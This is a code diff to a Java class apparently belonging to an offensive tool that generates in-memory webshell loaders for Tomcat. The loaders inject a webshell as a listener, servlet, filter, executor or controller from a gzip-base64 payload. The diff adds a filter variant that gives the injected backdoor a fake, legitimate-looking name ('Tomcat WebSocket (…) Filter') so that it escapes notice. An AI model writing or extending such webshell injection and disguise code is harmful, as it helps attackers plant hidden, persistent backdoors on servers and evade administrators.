@@ -4,6 +4,7 @@ import com.ppp.JavaClassHelper;
 import com.ppp.annotation.Builder;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.maker.JavaClassUtils;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
@@ -19,7 +20,7 @@ public class MSLoaderBuilder {
      */
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Listener)
-    public byte[] tomcat_listener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+    public byte[] tomcatListener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
         return defaultLoader(cls, MSGzipBase64, javaClassHelper);
 
         // 暂时放弃，等写全了看看情况再考虑简化代码
@@ -85,17 +86,36 @@ public class MSLoaderBuilder {
     }
 
     @Middleware(Middleware.Tomcat)
-    @MemShell(MemShell.Executor)
-    public byte[] tomcat_executor(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+    @MemShell(MemShell.Servlet)
+    public byte[] tomcatServlet(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        String name = javaClassHelper.getNAME();
+        javaClassHelper.setNAME(name + "Servlet");
+
         return defaultLoader(cls, MSGzipBase64, javaClassHelper);
     }
 
     @Middleware(Middleware.Tomcat)
-    @MemShell(MemShell.Servlet)
-    public byte[] tomcat_servlet(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
-        String name = javaClassHelper.getNAME();
-        javaClassHelper.setNAME(name + "Servlet");
+    @MemShell(MemShell.Filter)
+    public byte[] tomcatFilter(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        StringBuilder sb = new StringBuilder();
+        String name = javaClassHelper.getCLASSNAME();
+        String simpleTypeName = name.substring(name.lastIndexOf(".") + 1);
 
+        for (int i = 0; i < simpleTypeName.length(); ++i) {
+            if (Character.isUpperCase(simpleTypeName.charAt(i))) {
+                sb.append(simpleTypeName.charAt(i));
+            }
+        }
+
+        String filterName = String.format("Tomcat WebSocket (%s%s) Filter", sb.toString(), RanDomUtils.generateRandomOnlyNum(3));
+        javaClassHelper.setNAME(filterName);
+
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Executor)
+    public byte[] tomcatExecutor(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
         return defaultLoader(cls, MSGzipBase64, javaClassHelper);
     }
 
@@ -107,10 +127,10 @@ public class MSLoaderBuilder {
     @MemShell(MemShell.Controller)
     public byte[] controller(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
         StringBuilder sb = new StringBuilder();
-        String name = javaClassHelper.getNAME();
+        String name = javaClassHelper.getCLASSNAME();
         String simpleTypeName = name.substring(name.lastIndexOf(".") + 1);
 
-        for(int i = 0; i < simpleTypeName.length(); ++i) {
+        for (int i = 0; i < simpleTypeName.length(); ++i) {
             if (Character.isUpperCase(simpleTypeName.charAt(i))) {
                 sb.append(simpleTypeName.charAt(i));
             }
